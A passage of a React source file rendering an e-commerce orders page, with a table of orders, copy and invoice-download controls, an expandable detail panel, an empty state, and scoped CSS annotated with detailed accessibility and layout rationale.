                      // support ticket is worse than no control at all.
                      const copyValue = order.orderNumber || order.referenceId || '';
                      const isOpen = !!openRows[ rowId ];
                      // Derived from the render position, not the referenceId, so a row with no
                      // identifier still gets a unique valid id and aria-controls is never empty.
                      const detailId = `ord-detail-${ index }`;
                      // '' short-circuits rather than falling back to rowId: a row with no
                      // reference has no request this could ever key.
                      const state = ( invoiceKey && invoiceState[ invoiceKey ] ) || 'idle';
                      const amount = order.currencyUnexpected
                        ? ''
                        : formatPaiseINR( order.amountPaise, order.currency );
                      const label = STATUS_LABEL[ order.status ] || 'Status unavailable';
                      const note = order.status
                        ? ( STATUS_NOTE[ order.status ] || '' )
                        : 'Contact us and we will check.';

                      // FIRST MATCH WINS, and the gate plus the three structural refusals are
                      // all evaluated BEFORE any state is consulted. Computed as a word so the
                      // ladder stays readable and the JSX stays one short chain over one value.
                      const invoiceCell:
                        'absent' | 'ineligible' | InvoiceState =
                          !featureFlags.invoiceDownload ? 'absent'
                            : !INVOICE_ELIGIBLE.has( order.status ) ? 'ineligible'
                              : !invoiceKey ? 'ineligible'
                                : !Number.isInteger( order.createdAt )
                                  || ( order.createdAt as number ) <= 0 ? 'ineligible'
                                  : state;

                      // The panel's Invoice rung, same first-match-wins shape, and row 1 carries
                      // THE SAME FLAG TERM as the cell's first row so the two cannot drift. The
                      // third arm omits the rung entirely rather than echoing the transient
                      // state: the column carries that, and the panel must not grow a second
                      // place where it can disagree with the column.
                      const panelInvoice =
                        ( !featureFlags.invoiceDownload || state === 'none' )
                          ? 'No invoice for this order. Some paid orders never get one — '
                            + 'contact us and we will check.'
                          : !INVOICE_ELIGIBLE.has( order.status )
                            ? 'An invoice is created once the payment is settled.'
                            : '';

                      return (
                        <React.Fragment key={ rowId }>
                          <tr className={ isOpen ? 'ord-tr ord-tr-open' : 'ord-tr' }>
                            { /* aria-label is the IDENTIFIER ONLY. A <th scope="row"> is
                                 re-announced before each data cell in a screen reader's table
                                 mode, and its default name is its text content - which here is
                                 the trigger, the copy button, the hint, the Ref line and the
                                 folded date, announced five times per row. The label RENAMES the
                                 cell; it does not hide what is in it, so everything inside stays
                                 in the DOM, focusable and separately named. */ }
                            <th scope="row" className="ord-td" aria-label={ displayId }>
                              <button
                                type="button"
                                className="ord-ordbtn"
                                aria-expanded={ isOpen }
                                aria-controls={ detailId }
                                onClick={ () => toggleRow( rowId ) }
                              >
                                <span
                                  className="ord-ordno"
                                  id={ `ord-id-${ index }` }
                                  data-wc-no-translate
                                >
                                  { displayId }
                                </span>
                                <span className="ord-caret" aria-hidden="true">
                                  { isOpen ? '\u25be' : '\u25b8' }
                                </span>
                              </button>
                              { /* THE CONTROL AND ITS HINT ARE GATED TOGETHER, inside ONE
                                   fragment. A fragment emits no element, so .ord-tip stays the
                                   IMMEDIATE FOLLOWING SIBLING of .ord-copy, which the `~` reveal
                                   selectors require - wrapping the pair in a span, or nesting
                                   the hint inside the button, would silently kill the hover and
                                   focus reveals while leaving .ord-tip-on working, so the bug
                                   would show up only on pointer and keyboard.

                                   Gated together and not just the button, because
                                   visibility:hidden KEEPS the box: an unconditional hint would
                                   leave a permanently invisible 14px line on every row that can
                                   never reveal it - a row with neither identifier, and every row
                                   in a non-secure context. Reserving space for an unreachable
                                   element is not a layout guarantee, it is a blank line. */ }
                              { canCopy && copyValue && (
                                <>
                                  <button
                                    type="button"
                                    className="ord-copy"
                                    aria-label={ `Copy order ID ${ copyValue }` }
                                    onClick={ () => copyId( rowId, copyValue, index ) }
                                  >
                                    Copy
                                  </button>
                                  <span
                                    className={ copiedKey === rowId || copyFailedKey === rowId
                                      ? 'ord-tip ord-tip-on'
                                      : 'ord-tip' }
                                    aria-hidden="true"
                                  >
                                    { copiedKey === rowId
                                      ? 'Copied'
                                      : copyFailedKey === rowId
                                        ? 'Press your copy key'
                                        : 'Copy order ID' }
                                  </span>
                                </>
                              ) }
                              { /* On the row rather than in the panel: WhatsApp sends this as
                                   `Ref:`, and an operator reading a support ticket should see it
                                   without expanding anything. */ }
                              <span className="ord-ref" data-wc-no-translate>
                                Ref { order.referenceId }
                              </span>
                              { /* The Date column's understudy. ALWAYS in the DOM and revealed
                                   by one media query - no JS width branch, no matchMedia, no
                                   resize listener - so the rendered tree is identical at every
                                   width, which is also what makes the fold assertable in jsdom
                                   where there is no viewport. */ }
                              <span className="ord-subdate">{ date }</span>
                            </th>
                            { /* Deliberately TRANSLATABLE: a localised month name is an
                                 improvement and no decision depends on its spelling. Empty on an
                                 unreadable createdAt, never "Invalid Date". */ }
                            <td className="ord-td ord-col-date">{ date }</td>
                            <td className="ord-td ord-td-num">
                              { amount
                                // Flagged because SupportWidget rewrites text-node values, and a
                                // regrouped or renumbered amount would make this page lie about
                                // money. "Amount unavailable" stays unflagged prose, so it
                                // translates.
                                ? <span className="ord-amount" data-wc-no-translate>{ amount }</span>
                                : 'Amount unavailable' }
                            </td>
                            <td className="ord-td">
                              <span
                                className={ STATUS_FIRM.has( order.status )
                                  ? 'ord-status ord-status-firm'
                                  : 'ord-status' }
                              >
                                <span className="ord-status-label">{ label }</span>
                                { note && <span className="ord-status-note">{ note }</span> }
                              </span>
                            </td>
                            <td className="ord-td">
                              { invoiceCell === 'absent' || invoiceCell === 'none'
                                // Terminal, and the row does not re-ask: for some paid orders
                                // "no invoice" is permanent rather than transient. Visible,
                                // translatable words rather than a dash plus hidden text -
                                // this page has no visually-hidden utility available, because
                                // both height:1px and overflow:hidden are forbidden here.
                                ? 'No invoice yet'
                                : (
                                  <>
                                    <button
                                      type="button"
                                      className="ord-inv"
                                      disabled={ invoiceCell === 'ineligible'
                                        || invoiceCell === 'busy' }
                                      aria-busy={ invoiceCell === 'busy' ? true : undefined }
                                      onClick={ () => downloadInvoice( order ) }
                                    >
                                      { invoiceCell === 'busy'
                                        ? 'Preparing…'
                                        : invoiceCell === 'failed'
                                          ? 'Try again'
                                          : 'Download invoice' }
                                    </button>
                                    { invoiceCell === 'failed' && (
                                      <span className="ord-invnote">
                                        Could not fetch the invoice
                                      </span>
                                    ) }
                                    { /* THE LABEL STAYS "Download invoice" HERE. A failed row
                                         attempted and did not get an invoice, so "Try again"
                                         names what it is being asked to do. A rate-limited row
                                         was not refused the invoice at all - it was refused the
                                         CADENCE - so the action is unchanged and the message,
                                         not the label, carries the new information.
                                         Relabelling it would invite the immediate second click
                                         the limiter just declined. */ }
                                    { invoiceCell === 'rate' && (
                                      <span className="ord-invnote">
                                        Too many requests. Wait a moment.
                                      </span>
                                    ) }
                                  </>
                                ) }
                            </td>
                          </tr>
                          { isOpen && (
                            // A <td>, never a <th>, so the five-column header equality is
                            // unaffected. colSpan={5} because a detail spanning fewer would
                            // misalign the hairlines.
                            <tr className="ord-detailrow ord-tr-open">
                              <td className="ord-detailcell" colSpan={ 5 }>
                                <div id={ detailId }>
                                  { /* The retained definition-list treatment, which is why the
                                       .ord-facts rules survive the card list being deleted. */ }
                                  <dl className="ord-facts">
                                    <dt>Order number</dt>
                                    <dd>
                                      { order.orderNumber
                                        ? <span data-wc-no-translate>{ order.orderNumber }</span>
                                        : 'Not assigned' }
                                    </dd>
                                    <dt>Reference</dt>
                                    <dd>
                                      { order.referenceId
                                        ? <span data-wc-no-translate>{ order.referenceId }</span>
                                        : 'Not available' }
                                    </dd>
                                    <dt>Placed</dt>
                                    <dd>{ dateTimeLabel( order.createdAt ) }</dd>
                                    <dt>Amount</dt>
                                    { /* THE SAME RENDERED STRING as the Amount cell, not
                                         recomputed - one formatter, one value. */ }
                                    <dd>
                                      { amount
                                        ? <span data-wc-no-translate>{ amount }</span>
                                        : 'Amount unavailable' }
                                    </dd>
                                    <dt>Status</dt>
                                    <dd>{ note ? `${ label } — ${ note }` : label }</dd>
                                    <dt>Items</dt>
                                    { /* Stated once per opened panel rather than omitted: the
                                         owner asked for items, `items` cannot reach this wire
                                         without deleting and recreating a production GSI, and a
                                         silent absence reads as a bug. This is the slot the data
                                         lands in if that projection ever changes. */ }
                                    <dd>Item details are not available for this order.</dd>
                                    { !!panelInvoice && (
                                      <>
                                        <dt>Invoice</dt>
                                        <dd>{ panelInvoice }</dd>
                                      </>
                                    ) }
                                  </dl>
                                </div>
                              </td>
                            </tr>
                          ) }
                        </React.Fragment>
                      );
                    } ) }
                  </tbody>
                </table>
              </div>

              { /* ONE page-level polite region, not one per row. It is VISIBLE prose, because
                   §6.4's source gates leave no visually-hidden utility available on this page;
                   it is empty at rest, carries no identifier, and translates. */ }
              <span className="ord-live" role="status" aria-live="polite">{ liveMessage }</span>

              { moreFailed && (
                <p className="ord-notice" role="status">
                  We could not load your orders just now. Try again shortly.
                </p>
              ) }

              { !!cursor && (
                <button
                  type="button"
                  className="ord-quiet"
                  onClick={ loadMore }
                  disabled={ loadingMore }
                >
                  { loadingMore ? 'Loading…' : 'Show more orders' }
                </button>
              ) }
            </section>
          ) }

          { view === 'empty' && (
            <section className="ord-empty" aria-labelledby="ord-empty-title">
              <h2 className="ord-h2" id="ord-empty-title">No orders yet</h2>
              { checking
                ? (
                  // A SUB-STATE, not a sixth state: only the body is replaced, and it resolves
                  // on its own. The line is neutral because this endpoint cannot know whether a
                  // payment exists - it only knows the first page was empty, and the common
                  // visitor on that branch has never bought anything. "Your order is being
                  // confirmed" would be a confident wrong statement to most of them.
                  <p className="ord-p" role="status">Checking for recent orders…</p>
                )
                : (
                  <>
                    <p className="ord-p">
                      Anything you buy from us will show up here with its payment status.
                    </p>
                    <PillButton as="a" href="/shop/" action="Shop" />
                    { /* WIDENED on purpose, and the second clause is the load-bearing half:
                         finalization can stage PURCHASED_SNAPSHOT_MISSING and return BEFORE the
                         order write, so a captured payment can leave no order row at all,
                         permanently, with no later writer able to create one. This page must
                         therefore not assert that nothing was bought. */ }
                    <p className="ord-aside">
                      Ordered over WhatsApp, or paid in the last few minutes and don&apos;t see
                      it here? Contact us and we will check.
                    </p>
                  </>
                ) }
            </section>
          ) }
              </div>
            </div>
          ) }
        </div>

        <style jsx>{`
          /* ord- prefixed throughout: the globally imported src/styles/*.css declares unscoped
             rules for generic names and styled-jsx does not shield a page from them. Every rule
             lives in THIS return tree - no row helper and no hoisted <style jsx> variable,
             because styled-jsx stamps its scoping class only onto JSX it compiles alongside, and
             the run-together "Sign inSend code" the owner reported was that exact bug.

             No top padding, no measure, no gutters, no font-family on a container and no
             viewport height at all: PageTopBand owns every one of those, and a second copy is a
             second thing to get wrong at one of the two header heights. */

          /* Declared rather than inferred. prefers-color-scheme appears zero times under src/,
             so the site is light-only; stating it stops a browser inferring a scheme and
             recolouring form controls against a hardcoded light palette. */
          /* 1100px, not the 700px a single column of prose wanted: a five-column table inside
             700px is a permanent horizontal scroll. 1100 sits INSIDE PageTopBand's 1300px
             measure, so the band's gutters still apply and nothing re-declares them. */
          .ord-page{color-scheme:light;display:flex;flex-direction:column;gap:32px;max-width:1100px}

          /* Mobile-first: one column, panel above orders, which is both the DOM order and the
             layout this page already had. The 1024px override lives with every other media
             query at the foot of this stylesheet, after the defaults it overrides. */
          .ord-shell{display:grid;grid-template-columns:1fr;gap:28px}
          /* min-inline-size:0 for the same reason as minmax(0,...): a flex/grid item defaults to
             min-content and refuses to shrink. No position:sticky - the panel is short, and
             sticky interacts badly with overflow ancestors. */
          .ord-panel,.ord-main{display:flex;flex-direction:column;gap:18px;min-inline-size:0}

          /* The section rung: 700 against the band's 600 h1. That inversion is the site's and is
             deliberate - PageTopBand says not to "correct" it. Font stack DECLARED, not
             inherited: with the global body rule absent an inheriting lockup falls to a serif
             while a declaring headline stays on Inter. */
          .ord-h2{
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
            font-size:clamp(28px,3.2vw,40px);font-weight:700;line-height:1.08;
            letter-spacing:-1.2px;color:rgba(0,0,0,.95);margin:0 0 14px;
          }
          /* The one body rung: 20px/400/1.4/-.125px at rgba(0,0,0,.898), 18px under 767px. */
          .ord-p,.ord-aside{
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
            font-size:20px;font-weight:400;line-height:1.4;letter-spacing:-.125px;
            color:rgba(0,0,0,.898);margin:0;
          }
          .ord-gate{display:flex;flex-direction:column;align-items:flex-start;gap:20px}
          .ord-nodetails{padding:18px;border:1px solid #e5e7eb;border-radius:14px;background:#fff}
          .ord-link{color:#1a3a2a;font-weight:600;text-decoration:underline;text-decoration-thickness:1px;text-underline-offset:2px}

          /* The state treatment, lifted from .cart-status: a lime tint behind a solid lime
             inline-start edge with #1a3a2a type. A luminance and weight step rather than a hue,
             which is what survives forced-colors and reduced colour discrimination - and colour
             is never the only cue, because every one of these states is also stated in words. */
          .ord-notice{
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
            margin:0;padding:14px 16px;border-inline-start:4px solid #d1f470;border-radius:10px;
            background:rgba(209,244,112,.22);color:#1a3a2a;
            font-size:16px;font-weight:700;line-height:1.5;
          }

          /* A TABLE IS CORRECT HERE, and the 280px objection the previous comment raised is
             answered by the container rather than by avoiding a table: .ord-tablewrap's
             overflow-x:auto plus the shell's minmax(0,1fr) keep
             document.documentElement.scrollWidth - vw at 0, which is what
             tools/browser/devicecheck.js measures. The definition list, which does still
             collapse to one column for free, is now the DETAIL PANEL's layout - which is why
             these three rules survive the card markup being deleted. */
          .ord-table{
            width:100%;border-collapse:collapse;
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
          }
          .ord-tablewrap{overflow-x:auto;border:1px solid #e5e7eb;border-radius:14px;background:#fff}
          .ord-tablewrap:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}

          /* 1px and static: these borders never change. The row's hover is a background tint
             only, and the 2px weight stays reserved for hoverable controls. */
          .ord-th{
            text-align:start;padding:14px 16px;border-block-end:1px solid #e5e7eb;
            font-size:12px;font-weight:700;letter-spacing:0;color:#1a3a2a;white-space:nowrap;
          }
          .ord-th-num{text-align:end}
          .ord-tr{border-block-start:1px solid #e5e7eb}
          /* A reading aid, not an affordance: the <tr> has no onClick, no role, no tabindex and
             no cursor:pointer, so there is nothing to discover and fail to activate. Row
             tracking across five columns is what the tint is for. No :active equivalent - a tap
             on a row must do nothing and look like it did nothing. */
          .ord-tr:hover{background:rgba(209,244,112,.22)}

          /* text-align:start and font-weight:400 are RESETS, and required rather than tidy:
             .ord-td is also carried by the <th scope="row"> in column 1, where the UA stylesheet
             gives font-weight:bold;text-align:center. .ord-th's start alignment does not reach
             it (that class is on the column headers only), so without these two the widest cell
             on the page renders CENTRED against four start/end-aligned columns with its loose
             text in bold. "start", never "left" - the source gate forbids physical directions
             and text-align:left matches it. */
          .ord-td{
            padding:16px;font-size:16px;line-height:1.5;color:#1a1a1a;vertical-align:top;
            text-align:start;font-weight:400;
          }
          .ord-td-num{text-align:end;font-variant-numeric:tabular-nums}
          .ord-ordno{font-size:16px;font-weight:700;letter-spacing:-.25px;color:#1a1a1a;overflow-wrap:anywhere}

          /* The 14px/400/rgba(0,0,0,.54) sub-line rung, shared by all three sub-lines below the
             identifier. Not 13px: a one-pixel "table cells are tighter" exception is not a
             reason to leave the ladder. */
          .ord-ref{display:block;font-size:14px;font-weight:400;color:rgba(0,0,0,.54)}
          /* Same rung, but it is the Date column's understudy: hidden while that column is
             visible, so the date renders EXACTLY ONCE at every width. Declared display:none
             here, ahead of every media query, and flipped in the SAME query that hides the
             column it replaces - separating the two is what once rendered the date twice above
             767px, and a test that checked only the column would have passed on it. */
          .ord-subdate{display:none;font-size:14px;font-weight:400;color:rgba(0,0,0,.54)}
          .ord-invnote{display:block;font-size:14px;font-weight:400;color:rgba(0,0,0,.54)}

          .ord-ordbtn{
            display:inline-flex;align-items:center;gap:8px;min-height:44px;
            margin:0;padding:0;border:0;background:none;cursor:pointer;
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
            text-align:start;color:#1a1a1a;
            text-decoration:underline;text-decoration-thickness:1px;text-underline-offset:2px;
          }
          /* 1px at rest, 2px on hover and focus - the hairline split applied to a TEXT
             affordance rather than to a border, so the "2px means hoverable" signal still holds
             without inventing a boxed control inside a table cell. The vocabulary is
             .ord-link's, reused rather than coined. */
          .ord-ordbtn:hover,.ord-ordbtn:focus-visible{text-decoration-thickness:2px}
          .ord-ordbtn:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
          .ord-caret{font-size:12px;color:#1a3a2a}

          .ord-tr-open{background:rgba(209,244,112,.22)}
          .ord-detailcell{padding:0 16px 18px;border-block-end:1px solid #e5e7eb}
          .ord-live{font-size:14px;color:rgba(0,0,0,.54)}

          /* THE ONE PERMITTED HIDE MECHANISM ON THIS PAGE, and it appears exactly once.
             visibility:hidden KEEPS the box, so revealing the hint shifts nothing - which a
             display:none -> block swap or a conditional render would not. It cannot be an
             absolutely positioned popover: .ord-tablewrap sets overflow-x:auto, and a container
             with overflow-x:auto computes overflow-y to auto as well, so anything absolutely
             positioned inside it is clipped vertically. That is why InfoTooltip renders through
             a portal - and a portal's content sits outside this return tree, where styled-jsx
             cannot stamp it. The text here is REDUNDANT (the button's visible word is "Copy" and
             its accessible name is "Copy order ID <id>"), so nothing is available only on hover
             and there is nothing for a touch user to miss. */
          .ord-tip{
            display:block;visibility:hidden;
            font-size:14px;font-weight:400;color:rgba(0,0,0,.54);
          }
          .ord-copy:hover ~ .ord-tip,.ord-copy:focus-visible ~ .ord-tip,.ord-tip-on{visibility:visible}

          .ord-facts{margin:0;display:grid;grid-template-columns:96px 1fr;gap:8px 12px;align-items:baseline}
          .ord-facts dt{font-size:12px;font-weight:700;color:#1a3a2a}
          .ord-facts dd{margin:0;font-size:16px;line-height:1.5;color:#1a1a1a}
          .ord-amount{font-weight:700}
          .ord-status{
            display:inline-flex;flex-direction:column;gap:2px;
            padding:14px 16px;border-inline-start:3px solid #d1f470;border-radius:10px;
            background:rgba(209,244,112,.22);color:#1a3a2a;line-height:1.5;
          }
          .ord-status-firm{border-inline-start-width:4px}
          .ord-status-label{font-size:16px;font-weight:600}
          .ord-status-firm .ord-status-label{font-weight:700}
          .ord-status-note{font-size:14px;font-weight:400}

          /* The quiet secondary, reused from /checkout/status/'s co-btn-quiet so the page keeps
             exactly one lime SURFACE (the pill) and this one carries a lime EDGE instead. The
             control is identified by its <button> semantics and its #1a3a2a-on-white label, not
             by the edge - #d1f470 on white is 1.24:1 and does not clear 1.4.11 on its own - and
             the focus indicator is the dark outline. */
          /* THE INVOICE AND COPY CONTROLS ARE NEW SIZES OF THIS, NOT NEW BUTTONS, and
             "inherits" is not a CSS mechanism - so the mechanism is to EXTEND this selector
             list. Nothing in the body changes. A duplicated block was rejected by name: two
             copies of border:2px solid #d1f470 and min-height:44px drift independently, and
             the tap-target gate would then pass on whichever copy still said 44px. Two of these
             classes on one element was rejected too - the override would depend on source order
             between two classes of equal specificity, which is the fragility that gets "fixed"
             with !important.

             The first :disabled selector is kept on purpose: dropping it would stop dimming
             "Show more orders" at rest. align-self:flex-start comes along from this body and is
             inert inside a <td>, which is not a flex container - noted so it is not read as a
             mistake. */
          .ord-quiet,.ord-inv,.ord-copy{
            align-self:flex-start;display:inline-flex;align-items:center;justify-content:center;
            min-height:44px;padding:0 24px;border:2px solid #d1f470;border-radius:50px;
            background:#fff;color:#1a3a2a;font:inherit;font-size:17px;font-weight:600;cursor:pointer;
          }
          .ord-quiet:hover:not(:disabled),.ord-inv:hover:not(:disabled),.ord-copy:hover:not(:disabled){background:rgba(209,244,112,.22)}
          .ord-quiet:focus-visible,.ord-inv:focus-visible,.ord-copy:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
          .ord-quiet:disabled,.ord-inv:disabled,.ord-copy:disabled{opacity:.55;cursor:default}

          /* The only differences, as overrides AFTER the shared body. font-size has to be
             re-stated because that body sets font:inherit, a shorthand that resets it. */
          .ord-inv{font-size:15px;padding:0 16px}
          .ord-copy{font-size:14px;padding:0 12px;margin-inline-start:12px}

          .ord-list,.ord-empty{display:flex;flex-direction:column;align-items:flex-start;gap:18px}
          .ord-list .ord-h2,.ord-empty .ord-h2{margin:0}

          /* EVERY MEDIA QUERY LIVES BELOW HERE, after the defaults it overrides. */
          @media(min-width:1024px){
            /* minmax(0,1fr) IS NOT OPTIONAL and is the single most important line here. A
               bare 1fr is minmax(auto,1fr), so the column refuses to shrink below its content's
               intrinsic width, a wide table blows the grid out, and the overflow lands on the
               DOCUMENT - which is what tools/browser/devicecheck.js measures
               (document.documentElement.scrollWidth - vw) and fails on at 280px. With
               minmax(0,...) the column shrinks and the table's own scroll container takes it.

               1024px rather than the site's 767px body rung: a 340px panel beside a table needs
               about 1024px before the table has usable room. */
            .ord-shell{grid-template-columns:340px minmax(0,1fr);gap:32px;align-items:start}
            /* Collapsed while the editor is open. CheckoutProfile's own grid is 1fr 1fr 1.5fr
               and AddressFields' is 1fr 1fr, and both collapse only at a max-width:767px
               VIEWPORT query - not a container query - so inside a 340px panel on a 1280px
               desktop they would stay three- and two-up and render crushed inputs. Fixing that
               properly means container queries on two shared components another phase owns. */
            .ord-shell-editing{grid-template-columns:1fr}
          }

          @media(max-width:767px){
            .ord-p,.ord-aside{font-size:18px}
            .ord-facts{grid-template-columns:1fr;gap:4px}
            /* BOTH HALVES OF THE FOLD, IN ONE QUERY. The fold hides a COLUMN, so the class sits
               on the <th> and the <td> together - a class on only the header leaves the data
               visible under a vanished header and the column indices stop agreeing. */
            .ord-col-date{display:none}
            .ord-subdate{display:block}
          }

          /* NO ENTRANCE ANIMATION OF ITS OWN, and the absence is the point: opacity:0 does not
             remove an element from the tab order, and this page's children contain buttons, a
             link and a form. PageTopBand arms only its heading and sub-line, never children. */
        `}</style>
      </PageTopBand>
    </>
  );
}
